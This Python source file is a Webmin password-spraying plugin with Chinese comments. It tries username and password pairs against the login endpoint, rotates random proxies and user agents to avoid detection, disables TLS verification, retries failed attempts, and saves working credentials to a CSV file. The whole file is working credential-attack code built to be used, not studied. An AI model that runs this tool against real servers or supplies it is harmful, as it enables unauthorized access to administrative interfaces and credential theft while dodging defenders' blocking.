#!/usr/bin/env python
# webmin_plugin.py (優化後)
# Webmin 密碼噴灑插件 - 加入 proxy_pool 隨機代理支援

import logging
import requests
import csv
import os
from threading import Lock
import random
import re

requests.packages.urllib3.disable_warnings()

class WebminBruteForcePlugin:
    """Webmin 密碼噴灑插件"""

    def __init__(self, threads=5, timeout=10, debug=False, random_agent=False,
                user_agents=None, proxy=None, proxy_pool=None, logger=None):
        self.threads = threads
        self.timeout = timeout
        self.debug = debug
        self.random_agent = random_agent
        self.user_agents = user_agents or [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
            "Mozilla/5.0 (Windows NT 6.1; WOW64)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
        ]
        self.lock = Lock()
        self.logger = logger or self.setup_logger()
        self.proxy = proxy
        self.proxy_pool = proxy_pool or []
        self.session = requests.Session()
        self.session.verify = False

    def setup_logger(self):
        logger = logging.getLogger("WebminBruteForcePlugin")
        logger.setLevel(logging.DEBUG if self.debug else logging.INFO)
        if logger.hasHandlers():
            logger.handlers.clear()
        formatter = logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s',
            '%Y-%m-%d %H:%M:%S')
        ch = logging.StreamHandler()
        ch.setFormatter(formatter)
        logger.addHandler(ch)
        return logger

    def get_user_agent(self):
        return random.choice(self.user_agents) if self.random_agent else self.user_agents[0]

    def update_proxy(self):
        if self.proxy_pool:
            p = random.choice(self.proxy_pool)
            self.session.proxies.update({'http': p, 'https': p})
        elif self.proxy:
            self.session.proxies.update({'http': self.proxy, 'https': self.proxy})

    def determine_protocol(self, host, port):
        for protocol in ["https", "http"]:
            try:
                url = f"{protocol}://{host}:{port}"
                resp = self.session.get(url, timeout=self.timeout)
                if resp.status_code < 400:
                    return protocol
            except requests.RequestException:
                continue
        return "https"

    def attempt_login(self, target, port, username, password):
        self.session.cookies.clear()
        agent = self.get_user_agent()
        protocol = self.determine_protocol(target, port)
        base_url = f"{protocol}://{target}:{port}"

        headers = {"User-Agent": agent}

        try:
            self.session.get(base_url + "/", headers=headers, timeout=self.timeout)
        except requests.RequestException as e:
            return False, f"Initial GET failed: {e}"

        data = {"user": username, "pass": password}
        try:
            resp = self.session.post(
                base_url + "/session_login.cgi",
                headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
                data=data,
                timeout=self.timeout,
                allow_redirects=False
            )
        except requests.RequestException as e:
            return False, f"Login POST failed: {e}"

        if resp.status_code != 302:
            return False, f"Unexpected status {resp.status_code}"

        sid = resp.cookies.get("sid")
        if not sid:
            return False, "No SID received"

        try:
            resp_home = self.session.get(base_url + "/", headers=headers, timeout=self.timeout)
        except requests.RequestException as e:
            return False, f"Final GET failed: {e}"

        if "webmin actions log" in resp_home.text.lower():
            return True, resp_home.status_code
        else:
            return False, "Login verification failed"

    def write_success_csv(self, file_path, target, port, username, password):
        with self.lock:
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            write_header = not os.path.exists(file_path) or os.path.getsize(file_path) == 0
            with open(file_path, 'a', newline='', encoding='utf-8') as f:
                writer = csv.DictWriter(f, fieldnames=["Target", "Port", "Username", "Password", "Status"])
                if write_header:
                    writer.writeheader()
                writer.writerow({
                    "Target": target,
                    "Port": port,
                    "Username": username,
                    "Password": password,
                    "Status": "Success"
                })

    def write_failure_csv(self, file_path, target, username, password, response_code, failure_reason):
        with self.lock:
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            write_header = not os.path.exists(file_path) or os.path.getsize(file_path) == 0
            with open(file_path, 'a', newline='', encoding='utf-8') as f:
                writer = csv.DictWriter(f, fieldnames=["Target", "Username", "Password", "ResponseCode", "FailureReason"])
                if write_header:
                    writer.writeheader()
                writer.writerow({
                    "Target": target,
                    "Username": username,
                    "Password": password,
                    "ResponseCode": response_code,
                    "FailureReason": failure_reason
                })

    def process_login(self, target, port, username, password, output_file, failed_log, timeout, retries):
        self.update_proxy()  # 🔁 每次測試前更新 proxy

        original_timeout = self.timeout
        self.timeout = timeout

        success = False
        msg = ""
        for attempt in range(1, retries + 1):
            self.logger.debug(f"Attempt {attempt}/{retries} {target}:{port} ({username}/{password})")
            success, msg = self.attempt_login(target, port, username, password)
            if success:
                msg = f"Success on attempt {attempt}"
                break
            else:
                msg = f"Failed attempt {attempt}: {msg}"

        log_msg = f"{'✅成功' if success else '❌失敗'} {target}:{port} - {username}/{password} | {msg}"
        self.logger.info(log_msg) if success else self.logger.warning(log_msg)

        if success:
            self.write_success_csv(output_file, target, port, username, password)
        elif failed_log:
            code_match = re.search(r'\b\d{3}\b', msg)
            code = code_match.group() if code_match else ""
            self.write_failure_csv(failed_log, target, username, password, code, msg)

        self.timeout = original_timeout

if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
    plugin = WebminBruteForcePlugin(
        threads=5, timeout=10, debug=True, random_agent=True, proxy="http://127.0.0.1:8080"
    )
    plugin.process_login(
        target="example.com",
        port=10000,
        username="admin",
        password="password",
        output_file="webmin_success.csv",
        failed_log="webmin_failed.csv",
        timeout=5,
        retries=3
    )




